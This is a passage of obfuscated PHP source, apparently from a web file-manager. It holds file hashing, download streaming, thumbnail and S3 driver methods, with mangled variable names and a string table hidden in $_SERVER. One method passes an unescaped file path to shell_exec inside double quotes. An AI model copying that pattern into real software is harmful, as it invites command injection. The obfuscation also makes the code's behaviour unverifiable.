$–Ù†õ€; } public static $md5Cache = array(); public function hashMd5($Å¶ŒÑÓª) { if (!$Å¶ŒÑÓª) { return md5($_SERVER[Š—Â“œÔ][12]); } $Å¶ŒÑÓª = $this->iconvSystem($Å¶ŒÑÓª); if (isset(self::$md5Cache[$Å¶ŒÑÓª])) { return self::$md5Cache[$Å¶ŒÑÓª]; } self::$md5Cache[$Å¶ŒÑÓª] = $this->hashMd5Shell($Å¶ŒÑÓª); if (!self::$md5Cache[$Å¶ŒÑÓª]) { self::$md5Cache[$Å¶ŒÑÓª] = @md5_file($Å¶ŒÑÓª); } return self::$md5Cache[$Å¶ŒÑÓª]; } private function hashMd5Shell($€èºâ•Ğ) { $–Á¢Î¶Ø =& $_SERVER[Š—Â“œÔ]; if (!$€èºâ•Ğ) { return md5($–Á¢Î¶Ø[12]); } if (!function_exists($–Á¢Î¶Ø[101])) { return !1; } $Ş¡¸·³ß = array($–Á¢Î¶Ø[102], $–Á¢Î¶Ø[103]); $¸îÉ†İ‚ = Cache::get($–Á¢Î¶Ø[104]); if (!$¸îÉ†İ‚) { $æ«ùƒó = BASIC_PATH . $–Á¢Î¶Ø[105]; $ùÑ‘É¿ = md5_file($æ«ùƒó); $¸îÉ†İ‚ = $–Á¢Î¶Ø[106]; foreach ($Ş¡¸·³ß as $³ñÈÍ´») { $áìˆå© = shell_exec($³ñÈÍ´» . "\40\x22{$æ«ùƒó}\x22"); if ($áìˆå© && substr(trim($áìˆå©), 0, 32) == $ùÑ‘É¿) { $¸îÉ†İ‚ = $³ñÈÍ´»; break; } } Cache::set($–Á¢Î¶Ø[104], $¸îÉ†İ‚, 3600); } if ($¸îÉ†İ‚ == $–Á¢Î¶Ø[106]) { return !1; } $áìˆå© = shell_exec($¸îÉ†İ‚ . "\40\x22{$€èºâ•Ğ}\x22"); $áìˆå© = str_replace($–Á¢Î¶Ø[107], $–Á¢Î¶Ø[12], $áìˆå©); return substr($áìˆå©, 0, 32); } public function link($¬¤¬Õ˜û) { return $¬¤¬Õ˜û; } public function fileOut($šŞà™¤, $ÑÉ˜â†õ = false, $¬ÛÅ‡½ = false, $‹ªÔÊ¨ = '') { $ÑšÇıÓú =& $_SERVER[Š—Â“œÔ]; $this->cacheMethod(null, null); if (!$šŞà™¤ || !$this->exist($šŞà™¤)) { show_json(LNG($ÑšÇıÓú[108]), !1, $¬ÛÅ‡½); } $šÀöÈ±ô = $this->getType() == $ÑšÇıÓú[109]; $¨¾­ßˆ° = $GLOBALS[$ÑšÇıÓú[6]][$ÑšÇıÓú[92]][$ÑšÇıÓú[110]][$ÑšÇıÓú[111]]; $‡â½Ö¼Ä = (double) $GLOBALS[$ÑšÇıÓú[6]][$ÑšÇıÓú[92]][$ÑšÇıÓú[110]][$ÑšÇıÓú[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $³àÓ´Á = $this->infoFull($šŞà™¤); $ú†êÚ Ş = $³àÓ´Á[$ÑšÇıÓú[79]]; $õœü¥¬Î = gmdate($ÑšÇıÓú[113], $³àÓ´Á[$ÑšÇıÓú[88]]); $ÊÉÔ³’‘ = $¬ÛÅ‡½ ? $¬ÛÅ‡½ : $this->iconvApp($³àÓ´Á[$ÑšÇıÓú[32]]); $”Ò·µÇÚ = 0; $¬ÀÎ÷è¨ = $ú†êÚ Ş - 1; $ö”²»ÏŒ = $this->ext($ÊÉÔ³’‘); if (in_array($ö”²»ÏŒ, array($ÑšÇıÓú[114], $ÑšÇıÓú[115], $ÑšÇıÓú[116], $ÑšÇıÓú[117]))) { $ö”²»ÏŒ = $ÑšÇıÓú[118]; } if (in_array($ö”²»ÏŒ, array($ÑšÇıÓú[119]))) { $ö”²»ÏŒ = $ÑšÇıÓú[120]; } if (!$‹ªÔÊ¨) { $‹ªÔÊ¨ = md5($õœü¥¬Î . $ú†êÚ Ş); } $‹ªÔÊ¨ = $ÑšÇıÓú[121] . $‹ªÔÊ¨ . $ÑšÇıÓú[121]; $ìğÊ›â‘ = get_file_mime($ö”²»ÏŒ); $íñƒÓø– = !0; $íñƒÓø– = isset($_GET[$ÑšÇıÓú[122]]) ? !1 : !0; if ($ÑÉ˜â†õ === !1 && !mime_support($ìğÊ›â‘)) { $ìğÊ›â‘ = $ÑšÇıÓú[123]; } header($ÑšÇıÓú[124]); header($ÑšÇıÓú[125] . $ìğÊ›â‘); $ï£ÍŸ«ô = rawurlencode($ÊÉÔ³’‘); $ï£ÍŸ«ô = $ÑšÇıÓú[121] . $ï£ÍŸ«ô . $ÑšÇıÓú[126] . $ï£ÍŸ«ô; if ($ÑÉ˜â†õ) { header($ÑšÇıÓú[127]); header($ÑšÇıÓú[128] . $ï£ÍŸ«ô); } else { if ($íñƒÓø–) { header($ÑšÇıÓú[129] . $ï£ÍŸ«ô); } } $ø±ŒõŸ£ = 3600 * 24 * 30; header($ÑšÇıÓú[130]); header($ÑšÇıÓú[131]); header($ÑšÇıÓú[132] . $ø±ŒõŸ£); header($ÑšÇıÓú[133] . gmdate($ÑšÇıÓú[113], time() + $ø±ŒõŸ£) . $ÑšÇıÓú[134]); if (isset($_SERVER[$ÑšÇıÓú[135]]) && strtotime($_SERVER[$ÑšÇıÓú[135]]) == $³àÓ´Á[$ÑšÇıÓú[88]]) { header($ÑšÇıÓú[136], !0, 304); die; } if (isset($_SERVER[$ÑšÇıÓú[137]]) && $_SERVER[$ÑšÇıÓú[137]] == $‹ªÔÊ¨) { header($ÑšÇıÓú[138] . $‹ªÔÊ¨, !0, 304); die; } header($ÑšÇıÓú[138] . $‹ªÔÊ¨); header($ÑšÇıÓú[139] . $õœü¥¬Î . $ÑšÇıÓú[134]); header($ÑšÇıÓú[140] . $ÊÉÔ³’‘); header($ÑšÇıÓú[141]); header($ÑšÇıÓú[142] . $ú†êÚ Ş); header($ÑšÇıÓú[143]); Hook::trigger($ÑšÇıÓú[144], $šŞà™¤, $ú†êÚ Ş, $ÊÉÔ³’‘, $ö”²»ÏŒ); if (!$ÑÉ˜â†õ && $ö”²»ÏŒ == $ÑšÇıÓú[145]) { if ($ú†êÚ Ş > 1024 * 1024 * 5) { die; } $½Âƒ†­× = $this->getContent($šŞà™¤); $½Âƒ†­× = Html::clearSVG($½Âƒ†­×); header($ÑšÇıÓú[146] . strlen($½Âƒ†­×)); echo $½Âƒ†­×; die; } $•—‰“‡é = strtolower($_SERVER[$ÑšÇıÓú[147]]); if ($šÀöÈ±ô && $•—‰“‡é && $¨¾­ßˆ°) { if (strstr($•—‰“‡é, $ÑšÇıÓú[148])) { header($ÑšÇıÓú[149] . $šŞà™¤); } else { if (strstr($•—‰“‡é, $ÑšÇıÓú[150])) { header($ÑšÇıÓú[151] . $šŞà™¤); } else { if (strstr($•—‰“‡é, $ÑšÇıÓú[152])) { header($ÑšÇıÓú[153] . $šŞà™¤); } } } if ($‡â½Ö¼Ä) { header($ÑšÇıÓú[154] . $‡â½Ö¼Ä); } return; } if (isset($_SERVER[$ÑšÇıÓú[155]])) { if (preg_match($ÑšÇıÓú[156], $_SERVER[$ÑšÇıÓú[155]], $ë“Æ­ü‡)) { $”Ò·µÇÚ = intval($ë“Æ­ü‡[1]); $”Ò·µÇÚ = $”Ò·µÇÚ <= 0 ? 0 : ($”Ò·µÇÚ >= $¬ÀÎ÷è¨ ? $¬ÀÎ÷è¨ : $”Ò·µÇÚ); if (!empty($ë“Æ­ü‡[2])) { $Ôì‡âî = intval($ë“Æ­ü‡[2]); $¬ÀÎ÷è¨ = $Ôì‡âî < $”Ò·µÇÚ ? $”Ò·µÇÚ : ($Ôì‡âî >= $¬ÀÎ÷è¨ ? $¬ÀÎ÷è¨ : $Ôì‡âî); } } header($ÑšÇıÓú[157]); header("\x43\x6f\156\x74\145\x6e\164\x2d\122\141\x6e\x67\145\x3a\40\142\171\164\x65\x73\40{$”Ò·µÇÚ}\x2d{$¬ÀÎ÷è¨}\x2f" . $ú†êÚ Ş); } else { header($ÑšÇıÓú[158]); } header($ÑšÇıÓú[159]); header($ÑšÇıÓú[160]); $Óı³Ôá‚ = !0; if ($_SERVER[$ÑšÇıÓú[161]] == $ÑšÇıÓú[162] && $ú†êÚ Ş > 1204 * 1024 * 1024 * 2) { $Óı³Ôá‚ = !1; } if ($Óı³Ôá‚) { header($ÑšÇıÓú[163] . ($¬ÀÎ÷è¨ - $”Ò·µÇÚ + 1)); } if ($_SERVER[$ÑšÇıÓú[164]] == $ÑšÇıÓú[165]) { return; } $¡ÕÊğÙÅ = array($ÑšÇıÓú[166] => !1, $ÑšÇıÓú[167] => $”Ò·µÇÚ, $ÑšÇıÓú[168] => $¬ÀÎ÷è¨, $ÑšÇıÓú[169] => $ö”²»ÏŒ, $ÑšÇıÓú[170] => $³àÓ´Á, $ÑšÇıÓú[171] => $ÑšÇıÓú[12], $ÑšÇıÓú[172] => 0); $¡ÕÊğÙÅ = Hook::filter($ÑšÇıÓú[173], $¡ÕÊğÙÅ); $ß»¶•¸ú = 1024 * 300; $ÕÕùÌ´ğ = 0; if ($‡â½Ö¼Ä) { $ÕÕùÌ´ğ = intval(1000 * 1000 * ($ß»¶•¸ú / $‡â½Ö¼Ä)); } while ($”Ò·µÇÚ <= $¬ÀÎ÷è¨) { $‘á‹üÜ¶ = timeFloat(); check_abort(); $é÷¢ñì = $¬ÀÎ÷è¨ - $”Ò·µÇÚ + 1; if ($é÷¢ñì <= $ß»¶•¸ú) { $ß»¶•¸ú = $é÷¢ñì; } $½Âƒ†­× = $this->fileSubstr($šŞà™¤, $”Ò·µÇÚ, $ß»¶•¸ú); if ($¡ÕÊğÙÅ[$ÑšÇıÓú[166]]) { $¡ÕÊğÙÅ[$ÑšÇıÓú[171]] = $½Âƒ†­×; $¡ÕÊğÙÅ[$ÑšÇıÓú[172]] = $”Ò·µÇÚ; $¡ÕÊğÙÅ = Hook::filter($ÑšÇıÓú[174], $¡ÕÊğÙÅ); $½Âƒ†­× = $¡ÕÊğÙÅ[$ÑšÇıÓú[171]]; } echo $½Âƒ†­×; $”Ò·µÇÚ += $ß»¶•¸ú; if ($ß»¶•¸ú == $é÷¢ñì) { $”Ò·µÇÚ = $¬ÀÎ÷è¨ + 1; } if ($ÕÕùÌ´ğ) { $ó­ÍÙ½Ä = intval(1000 * 1000 * (timeFloat() - $‘á‹üÜ¶)); $ÎóöÌ²Ğ = $ÕÕùÌ´ğ - $ó­ÍÙ½Ä; if ($ÎóöÌ²Ğ > 5) { usleep($ÎóöÌ²Ğ); } } } } public function fileOutServer($şä‘©ÂÙ, $¦Œ™©ÏÙ = false, $…èâ†¾¬ = false, $Éç‡…Ã = '') { $this->fileOut($şä‘©ÂÙ, $¦Œ™©ÏÙ, $…èâ†¾¬, $Éç‡…Ã); } public function fileOutLink($³™ßÎò“) { header($_SERVER[Š—Â“œÔ][175] . $³™ßÎò“); die; } public function cacheMethod($Õó´Åì×, $¯ò–„¾á, $ü±ëĞ´» = null) { $ôùÂîÑ =& $_SERVER[Š—Â“œÔ]; static $¬®ñ½Ù = array(); $ÛÌ½Ç—© = $¯ò–„¾á ? ltrim($this->getPathOuter($¯ò–„¾á), $ôùÂîÑ[8]) : $ôùÂîÑ[12]; $Ñ½­õ´î = $ôùÂîÑ[176] . $Õó´Åì× . $ôùÂîÑ[177] . rtrim($ÛÌ½Ç—©, $ôùÂîÑ[8]); if (is_null($Õó´Åì×)) { $¬®ñ½Ù = array(); return; } if (is_null($¯ò–„¾á)) { foreach ($¬®ñ½Ù as $Ñ½­õ´î => $Ø«È·ÙÏ) { if (!strstr($Ñ½­õ´î, $ôùÂîÑ[176] . $Õó´Åì× . $ôùÂîÑ[178])) { continue; } unset($¬®ñ½Ù[$Ñ½­õ´î]); } return; } if (!is_null($ü±ëĞ´»)) { $¬®ñ½Ù[$Ñ½­õ´î] = $ü±ëĞ´»; return; } $®¡âÕà = isset($¬®ñ½Ù[$Ñ½­õ´î]) ? $¬®ñ½Ù[$Ñ½­õ´î] : null; if (!is_null($®¡âÕà)) { return $®¡âÕà; } $®¡âÕà = $this->{$Õó´Åì×}($¯ò–„¾á); $¬®ñ½Ù[$Ñ½­õ´î] = $®¡âÕà; return $®¡âÕà; } public function cacheMethodInfoSet($˜»ÛÆ½, $¼¦Î´—, $ÆÈ¼—· = false) { $Ó§¼·¾ =& $_SERVER[Š—Â“œÔ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($Ó§¼·¾[179], $˜»ÛÆ½, $¼¦Î´—); $this->cacheMethod($Ó§¼·¾[180], $˜»ÛÆ½, $¼¦Î´— ? !1 : !0); if (is_array($ÆÈ¼—·)) { $this->cacheMethod($Ó§¼·¾[181], $˜»ÛÆ½, $ÆÈ¼—·); } } public function fileOutImage($ó¿ä½¯È, $‚ôÛŞ = 250) { $ÂöØ×ê­ =& $_SERVER[Š—Â“œÔ]; set_timeout(); if (substr($ó¿ä½¯È, 0, 4) == $ÂöØ×ê­[152]) { $this->fileOutLink($ó¿ä½¯È); } $€òµœÖ´ = $this->info($ó¿ä½¯È); $×²Èµ¤ = !1; $Ã²°‚ˆ = isset($GLOBALS[$ÂöØ×ê­[182]]) ? $GLOBALS[$ÂöØ×ê­[182]] : array(); if ($Ã²°‚ˆ && $Ã²°‚ˆ[$ÂöØ×ê­[183]] == $€òµœÖ´[$ÂöØ×ê­[87]]) { $€òµœÖ´ = $Ã²°‚ˆ; $ßÂ¤ü½¼ = $€òµœÖ´[$ÂöØ×ê­[184]]; if ($ßÂ¤ü½¼ && isset($ßÂ¤ü½¼[$ÂöØ×ê­[185]])) { if ($ßÂ¤ü½¼[$ÂöØ×ê­[185]] <= $‚ôÛŞ && $ßÂ¤ü½¼[$ÂöØ×ê­[186]] <= $‚ôÛŞ) { $×²Èµ¤ = !0; } } } if ($€òµœÖ´[$ÂöØ×ê­[79]] <= 1024 * 50 || $×²Èµ¤ || !function_exists($ÂöØ×ê­[187]) || $€òµœÖ´[$ÂöØ×ê­[169]] == $ÂöØ×ê­[188]) { return $this->fileOut($ó¿ä½¯È, !1, $€òµœÖ´[$ÂöØ×ê­[32]]); } $Ğ»ëÒÎ€ = kodIO::hashPath($€òµœÖ´); $Ïö–Áï = "\x63\157\166\x65\x72\x5f{$Ğ»ëÒÎ€}\x5f{$‚ôÛŞ}\56\160\x6e\147"; $êÖóÒŸà = IO_PATH_SYSTEM_TEMP . $ÂöØ×ê­[189]; $÷ºœÈ“Ÿ = IO::infoFullSimple($êÖóÒŸà); $ËĞòÓ¨¦ = $÷ºœÈ“Ÿ && is_array($÷ºœÈ“Ÿ) ? $÷ºœÈ“Ÿ[$ÂöØ×ê­[87]] : $ÂöØ×ê­[12]; if (!$ËĞòÓ¨¦) { $ËĞòÓ¨¦ = IO::mkdir($êÖóÒŸà); } if ($€òµœÖ´[$ÂöØ×ê­[190]] == $ÂöØ×ê­[191] && isset($€òµœÖ´[$ÂöØ×ê­[192]]) && $€òµœÖ´[$ÂöØ×ê­[192]] == kodIO::sourceID($ËĞòÓ¨¦)) { $¬Ï€¨ÇŞ = $€òµœÖ´[$ÂöØ×ê­[193]]; if ($‚ôÛŞ <= 500) { $½èû¹æÂ = preg_replace($ÂöØ×ê­[194], $ÂöØ×ê­[195], $€òµœÖ´[$ÂöØ×ê­[32]]); $¬Ï€¨ÇŞ = IO::fileNameExist($ËĞòÓ¨¦, $½èû¹æÂ); } return IO::fileOut(KodIO::make($¬Ï€¨ÇŞ), !1, $€òµœÖ´[$ÂöØ×ê­[32]]); } $†¬´×” = IO::fileNameExist($ËĞòÓ¨¦, $Ïö–Áï); if ($†¬´×”) { return IO::fileOut(KodIO::make($†¬´×”), !1, $€òµœÖ´[$ÂöØ×ê­[32]]); } if ($‚ôÛŞ > 1000) { $this->makeImageCover($ËĞòÓ¨¦, $ó¿ä½¯È, $Ïö–Áï, $‚ôÛŞ); $this->makeImageCover($ËĞòÓ¨¦, $ó¿ä½¯È, "\x63\x6f\x76\145\162\137{$Ğ»ëÒÎ€}\137\x32\65\x30\56\x70\x6e\x67", 250); $†¬´×” = IO::fileNameExist($ËĞòÓ¨¦, $Ïö–Áï); if ($†¬´×”) { return IO::fileOut(KodIO::make($†¬´×”), !1, $€òµœÖ´[$ÂöØ×ê­[32]]); } die; } if (!kodIO::allowCover($€òµœÖ´)) { return $this->fileOut($ó¿ä½¯È, !1, $€òµœÖ´[$ÂöØ×ê­[32]]); } $ƒ¨ÏşâÛ = Cache::get($Ïö–Áï); if ($ƒ¨ÏşâÛ == $ÂöØ×ê­[196] || $ƒ¨ÏşâÛ == $ÂöØ×ê­[197]) { echo $ƒ¨ÏşâÛ; die; } Cache::set($Ïö–Áï, $ÂöØ×ê­[197], 60); $ğäï‹œÆ = array($ËĞòÓ¨¦, $€òµœÖ´[$ÂöØ×ê­[87]], $Ïö–Áï, $‚ôÛŞ); $×Ï¬ˆ = $ÂöØ×ê­[198] . $€òµœÖ´[$ÂöØ×ê­[79]] . $ÂöØ×ê­[199] . $Ïö–Áï . $ÂöØ×ê­[200] . $€òµœÖ´[$ÂöØ×ê­[32]] . $ÂöØ×ê­[201] . $€òµœÖ´[$ÂöØ×ê­[87]]; TaskQueue::add($ÂöØ×ê­[202], $ğäï‹œÆ, $×Ï¬ˆ, $Ïö–Áï); } public function makeImageCover($éÀØÁÒÛ, $´å‰ƒœô, $ïƒıÓ†Š, $´³¬¯ú) { $©ƒÎ™®Ğ =& $_SERVER[Š—Â“œÔ]; if (IO::fileNameExist($éÀØÁÒÛ, $ïƒıÓ†Š)) { return $©ƒÎ™®Ğ[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¥­Ëù¥š = DATA_THUMB . $ïƒıÓ†Š; del_file($¥­Ëù¥š); $œƒ—ªÖŒ = IO::copy($´å‰ƒœô, TEMP_FILES, !1, $ïƒıÓ†Š); if (!@file_exists($œƒ—ªÖŒ)) { return $©ƒÎ™®Ğ[204]; } ImageThumb::createThumb($œƒ—ªÖŒ, $¥­Ëù¥š, $´³¬¯ú, $´³¬¯ú * 10); if (@file_exists($¥­Ëù¥š)) { Cache::remove($ïƒıÓ†Š); return IO::move($¥­Ëù¥š, $éÀØÁÒÛ); } Cache::set($ïƒıÓ†Š, $©ƒÎ™®Ğ[196], 600); del_file($¥­Ëù¥š); return $©ƒÎ™®Ğ[205] . $œƒ—ªÖŒ . $©ƒÎ™®Ğ[74]; } public function fileOutImageServer($’ëĞÔõ, $Ûô¨î¿ = 250) { $this->fileOutImage($’ëĞÔõ, $Ûô¨î¿); } public function fileNameAuto($ÂñÔèßÓ, $»Ñ‹ìü, $éŒü¡€ = REPEAT_RENAME, $»‰ò³îæ = false) { $Å«Ùóœä =& $_SERVER[Š—Â“œÔ]; $§Øıü¹ñ = $ÂñÔèßÓ === $Å«Ùóœä[12] ? $»Ñ‹ìü : rtrim($ÂñÔèßÓ, $Å«Ùóœä[8]) . $Å«Ùóœä[8] . $»Ñ‹ìü; if ($éŒü¡€ == REPEAT_REPLACE || !$this->exist($§Øıü¹ñ) || $»‰ò³îæ && $éŒü¡€ != REPEAT_RENAME_FOLDER) { return $»Ñ‹ìü; } if ($éŒü¡€ == REPEAT_SKIP) { return !1; } $¢‘÷Ñç² = $Å«Ùóœä[10] . get_path_ext($»Ñ‹ìü); $¢‘÷Ñç² = $¢‘÷Ñç² == $Å«Ùóœä[10] || $»‰ò³îæ ? $Å«Ùóœä[12] : $¢‘÷Ñç²; $‘»ñ€Àê = 1; $¸ÜšÉ£Ò = substr($»Ñ‹ìü, 0, strlen($»Ñ‹ìü) - strlen($¢‘÷Ñç²)); $È“â¬íÔ = $¸ÜšÉ£Ò . "\50{$‘»ñ€Àê}\51{$¢‘÷Ñç²}"; while ($this->exist(rtrim($ÂñÔèßÓ, $Å«Ùóœä[8]) . $Å«Ùóœä[8] . $È“â¬íÔ)) { $È“â¬íÔ = $¸ÜšÉ£Ò . "\x28{$‘»ñ€Àê}\x29{$¢‘÷Ñç²}"; $‘»ñ€Àê++; } return $È“â¬íÔ; } private function fileNameAutoList($ï—«†™Å, $ºêô³Œ, $«Õ†ğœ = false) { $Û‘…Ğ¨À =& $_SERVER[Š—Â“œÔ]; $ˆ·Ô£†İ = $this->listPath($ï—«†™Å, !0); $ˆ·Ô£†İ = array_merge($ˆ·Ô£†İ[$Û‘…Ğ¨À[85]], $ˆ·Ô£†İ[$Û‘…Ğ¨À[86]]); $ÉˆÄ— Ô = array_to_keyvalue($ˆ·Ô£†İ, $Û‘…Ğ¨À[12], $Û‘…Ğ¨À[32]); $»¾¦¶™¡ = $Û‘…Ğ¨À[10] . get_path_ext($ºêô³Œ); $»¾¦¶™¡ = $»¾¦¶™¡ == $Û‘…Ğ¨À[10] || $«Õ†ğœ ? $Û‘…Ğ¨À[12] : $»¾¦¶™¡; $ò±Úº© = substr($ºêô³Œ, 0, strlen($ºêô³Œ) - strlen($»¾¦¶™¡)); $¿˜ÇÚ = $ò±Úº© . "\x28\x30\x29{$»¾¦¶™¡}"; for ($ËíòšÔŞ = 1; $ËíòšÔŞ <= count($ÉˆÄ— Ô) + 1; $ËíòšÔŞ++) { $¿˜ÇÚ = $ò±Úº© . "\50{$ËíòšÔŞ}\x29{$»¾¦¶™¡}"; if (!in_array_not_case($¿˜ÇÚ, $ÉˆÄ— Ô)) { return $¿˜ÇÚ; } } return $¿˜ÇÚ; } public function listAllFiles($óÁõ„‡, $—üß€¸Š) { $Å¢èŞñ‘ =& $_SERVER[Š—Â“œÔ]; if (empty($—üß€¸Š)) { return array(); } $¯¢ìÏ÷¦ = array_keys($—üß€¸Š); $Áã€‘ = array(); $óÁõ„‡ = trim($óÁõ„‡, $Å¢èŞñ‘[8]); foreach ($—üß€¸Š as $ÊÉÈŞìÜ => $Šã¡ã‡ø) { $„±ôôÓ‹ = ltrim(substr(trim($ÊÉÈŞìÜ, $Å¢èŞñ‘[8]), strlen($óÁõ„‡)), $Å¢èŞñ‘[8]); if (substr($ÊÉÈŞìÜ, -1) == $Å¢èŞñ‘[8]) { $„±ôôÓ‹ = rtrim($„±ôôÓ‹, $Å¢èŞñ‘[8]) . $Å¢èŞñ‘[8]; } $Áã€‘ = array_merge($Áã€‘, $this->slicePath($„±ôôÓ‹)); } $‰¾¬ßæ” = array(); foreach (array_unique($Áã€‘) as $Î—ÆÓô‰) { $Ÿ–µ§É‘ = array($Å¢èŞñ‘[87] => $this->getPathOuter($Å¢èŞñ‘[8] . $óÁõ„‡ . $Å¢èŞñ‘[8] . $Î—ÆÓô‰), $Å¢èŞñ‘[78] => 1, $Å¢èŞñ‘[79] => 0); if (substr($Î—ÆÓô‰, -1) != $Å¢èŞñ‘[8]) { $Ÿ–µ§É‘[$Å¢èŞñ‘[78]] = 0; $ûªâ‰Û‰ = $this->getPath($óÁõ„‡ . $Å¢èŞñ‘[8] . $Î—ÆÓô‰); if (isset($—üß€¸Š[$ûªâ‰Û‰])) { $Õ“¼‡‹ = $—üß€¸Š[$ûªâ‰Û‰]; if (isset($Õ“¼‡‹[$Å¢èŞñ‘[79]])) { $Ÿ–µ§É‘[$Å¢èŞñ‘[79]] = intval($Õ“¼‡‹[$Å¢èŞñ‘[79]]); } if (isset($Õ“¼‡‹[$Å¢èŞñ‘[206]])) { $Ÿ–µ§É‘[$Å¢èŞñ‘[88]] = intval($Õ“¼‡‹[$Å¢èŞñ‘[206]]); } } } $‰¾¬ßæ”[] = $Ÿ–µ§É‘; } return $‰¾¬ßæ”; } public function slicePath($üŸ´¾¼“) { $¦¡‡›† =& $_SERVER[Š—Â“œÔ]; $ˆĞäçø = explode($¦¡‡›†[8], trim($üŸ´¾¼“, $¦¡‡›†[8])); $İÔåÏÚñ = 0; do { ++$İÔåÏÚñ; $£«Š•ï[] = implode($¦¡‡›†[8], array_slice($ˆĞäçø, 0, $İÔåÏÚñ)) . $¦¡‡›†[8]; } while ($İÔåÏÚñ < count($ˆĞäçø)); $£«Š•ï[count($ˆĞäçø) - 1] = $üŸ´¾¼“; return $£«Š•ï; } public function getHost() { $‡Œà´Ğ® =& $_SERVER[Š—Â“œÔ]; $˜ÓÈï¬‚ = parse_url(trim($this->domain, $‡Œà´Ğ®[8])); $¯òşÄâ = isset($˜ÓÈï¬‚[$‡Œà´Ğ®[207]]) ? $˜ÓÈï¬‚[$‡Œà´Ğ®[207]] : http_type(); $âéÛ†Ñ¬ = isset($˜ÓÈï¬‚[$‡Œà´Ğ®[208]]) ? $˜ÓÈï¬‚[$‡Œà´Ğ®[208]] : $˜ÓÈï¬‚[$‡Œà´Ğ®[87]]; if (isset($˜ÓÈï¬‚[$‡Œà´Ğ®[209]])) { $âéÛ†Ñ¬ .= $‡Œà´Ğ®[4] . $˜ÓÈï¬‚[$‡Œà´Ğ®[209]]; } return $¯òşÄâ . $‡Œà´Ğ®[210] . $âéÛ†Ñ¬; } public function pathEncode($à¶œ¶Ïî) { $‡«©‰ =& $_SERVER[Š—Â“œÔ]; return str_replace($‡«©‰[211], $‡«©‰[8], rawurlencode($à¶œ¶Ïî)); } public function writeLog($ßŒ§µ‹ƒ = '', $´•÷­°³ = false) { $ï…Öóñ =& $_SERVER[Š—Â“œÔ]; $¹·’¨Ìµ = in_array(ACTION, array($ï…Öóñ[212], $ï…Öóñ[213])); if (!$¹·’¨Ìµ && !GLOBAL_DEBUG) { return; } $³ÖĞ’‘Õ = $ßŒ§µ‹ƒ; static $”ı±›¼Ë = null; if (!$”ı±›¼Ë) { $”ı±›¼Ë = strtoupper($this->getType()); } $ßŒ§µ‹ƒ = $”ı±›¼Ë . $ï…Öóñ[214] . $ßŒ§µ‹ƒ; if ($´•÷­°³) { $”Çº®ªÏ = error_get_last(); if ($”Çº®ªÏ) { $ßŒ§µ‹ƒ = array($ßŒ§µ‹ƒ, $”Çº®ªÏ); } } write_log($ßŒ§µ‹ƒ, $ï…Öóñ[215]); if ($¹·’¨Ìµ) { throw new Exception($³ÖĞ’‘Õ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($˜Ì”»›ó) { set_timeout(); require_once SDK_DIR . $_SERVER[Š—Â“œÔ][216]; parent::__construct(); $this->_init($˜Ì”»›ó); } public function _init($”êÓÂ¦¦) { $Ù­®üôÔ =& $_SERVER[Š—Â“œÔ]; $this->config = $”êÓÂ¦¦; foreach ($”êÓÂ¦¦ as $Ğ”‡ì”¬ => $®„«¼ı) { if (isset($this->{$Ğ”‡ì”¬})) { $this->{$Ğ”‡ì”¬} = $®„«¼ı; } } $this->endpoint = $”êÓÂ¦¦[$Ù­®üôÔ[217]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ƒúûô€… = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ƒúûô€…, 0, 7) == $Ù­®üôÔ[218]) { $ƒúûô€… = $Ù­®üôÔ[219] . substr($ƒúûô€…, 7); } $this->client->setEndpoint($ƒúûô€…); if (in_array(ACTION, array($Ù­®üôÔ[212], $Ù­®üôÔ[213]))) { $this->client->setExceptions(); } } public function setSignVersion($´ì‰ÄÙÁ = "\x76\x34") { $this->signVer = $´ì‰ÄÙÁ; $this->client->setSignVersion($´ì‰ÄÙÁ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ó¨İÓŒ) { return null; } } public function isBucketCors() { $øóÌ—Ğ· =& $_SERVER[Š—Â“œÔ]; $†ÖâãØí = $this->getBucketCors(); if (!$†ÖâãØí || !is_array($†ÖâãØí)) { return !1; } if (!is_array($†ÖâãØí[$øóÌ—Ğ·[220]])) { $†ÖâãØí[$øóÌ—Ğ·[220]] = explode($øóÌ—Ğ·[50], $†ÖâãØí[$øóÌ—Ğ·[220]]); } if ($†ÖâãØí[$øóÌ—Ğ·[221]] != $øóÌ—Ğ·[222] || !in_array($øóÌ—Ğ·[222], $†ÖâãØí[$øóÌ—Ğ·[220]])) { return !1; } $‰åğİòÆ = array_map($øóÌ—Ğ·[223], $†ÖâãØí[$øóÌ—Ğ·[224]]); if (!is_array($‰åğİòÆ)) { $‰åğİòÆ = array(); } $ÁîÍ¨ŠÍ = array($øóÌ—Ğ·[225], $øóÌ—Ğ·[226], $øóÌ—Ğ·[227], $øóÌ—Ğ·[228], $øóÌ—Ğ·[229]); $‹á£ÃÄæ = array_diff($ÁîÍ¨ŠÍ, $‰åğİòÆ); return empty($‹á£ÃÄæ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($õÌ¾İ¤, $ŞÂÇêÑñ = '', $¿æÃÌê = REPEAT_RENAME) { $–ãúÁè = $this->setContent($õÌ¾İ¤, $ŞÂÇêÑñ); if ($–ãúÁè !== !1) { return $this->getPathOuter($õÌ¾İ¤); } return !1; } public function mkdir($±ê¿¼È, $´ºêÉä = REPEAT_SKIP) { $ìµ÷õÆÙ =& $_SERVER[Š—Â“œÔ]; if (empty($±ê¿¼È) && $±ê¿¼È !== $ìµ÷õÆÙ[230]) { return !1; } if ($´ºêÉä && $this->_isFolder($±ê¿¼È)) { return $this->getPathOuter($±ê¿¼È); } $ìÊ£Û§› = $this->setContent($±ê¿¼È, $ìµ÷õÆÙ[12], !0); if ($ìÊ£Û§› !== !1) { return $this->getPathOuter($±ê¿¼È); } return !1; } public function copyFile($ğôÔ«÷Ë, $ÄÂ’ä¿, $³ÇÆÉÊ = array()) { $»ÆÎ§äø =& $_SERVER[Š—Â“œÔ]; 